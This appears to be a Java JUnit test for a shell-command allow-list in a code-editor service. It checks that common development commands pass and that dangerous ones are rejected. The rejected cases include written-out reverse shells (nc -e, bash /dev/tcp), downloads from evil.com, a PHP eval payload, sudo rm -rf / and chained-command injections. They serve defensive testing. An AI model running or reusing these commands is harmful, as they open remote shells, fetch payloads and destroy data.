package com.exaple.codeEditer.Code.Editor;

import com.exaple.codeEditer.Code.Editor.service.AllowedCommandPolicy;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class AllowedCommandPolicyTest {

    private AllowedCommandPolicy policy;

    @BeforeEach
    public void setUp() {
        policy = new AllowedCommandPolicy();
    }

    @Test
    public void testLegitimateCommandsAllowed() {
        assertTrue(policy.isCommandAllowed("ls -la"));
        assertTrue(policy.isCommandAllowed("cd /app"));
        assertTrue(policy.isCommandAllowed("cat main.py"));
        assertTrue(policy.isCommandAllowed("echo 'hello'"));
        assertTrue(policy.isCommandAllowed("pwd"));
        assertTrue(policy.isCommandAllowed("mkdir test"));
        assertTrue(policy.isCommandAllowed("touch index.js"));
        assertTrue(policy.isCommandAllowed("node index.js"));
        assertTrue(policy.isCommandAllowed("npm run build"));
        assertTrue(policy.isCommandAllowed("python3 script.py"));
        assertTrue(policy.isCommandAllowed("mvn clean test"));
        assertTrue(policy.isCommandAllowed("git status"));
        assertTrue(policy.isCommandAllowed("grep -r 'foo' ."));
        assertTrue(policy.isCommandAllowed("find . -name '*.java'"));
    }

    @Test
    public void testDangerousAndUnknownCommandsBlocked() {
        // Known dangerous commands
        assertFalse(policy.isCommandAllowed("wget http://evil.com/malware.sh"));
        assertFalse(policy.isCommandAllowed("curl http://evil.com/x"));
        assertFalse(policy.isCommandAllowed("nc -e /bin/sh 10.0.0.1 4444"));
        assertFalse(policy.isCommandAllowed("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"));
        assertFalse(policy.isCommandAllowed("chmod +x script.sh"));
        assertFalse(policy.isCommandAllowed("perl -e 'use Socket;'"));
        assertFalse(policy.isCommandAllowed("php -r 'eval($_GET[1]);'"));

        // Arbitrary unknown commands (default deny)
        assertFalse(policy.isCommandAllowed("telnet 192.168.1.1"));
        assertFalse(policy.isCommandAllowed("socat - -"));
        assertFalse(policy.isCommandAllowed("sudo rm -rf /"));
        assertFalse(policy.isCommandAllowed("docker run -it ubuntu"));
        assertFalse(policy.isCommandAllowed("apt-get install nmap"));
        assertFalse(policy.isCommandAllowed("make build"));
    }

    @Test
    public void testChainedAndSubshellInjectionBlocked() {
        assertFalse(policy.isCommandAllowed("ls; wget http://evil.com/x"));
        assertFalse(policy.isCommandAllowed("echo hello && nc -e /bin/sh 1.2.3.4 80"));
        assertFalse(policy.isCommandAllowed("cat file.txt | curl http://evil.com"));
        assertFalse(policy.isCommandAllowed("echo `whoami`"));
        assertFalse(policy.isCommandAllowed("echo $(id)"));
    }
}
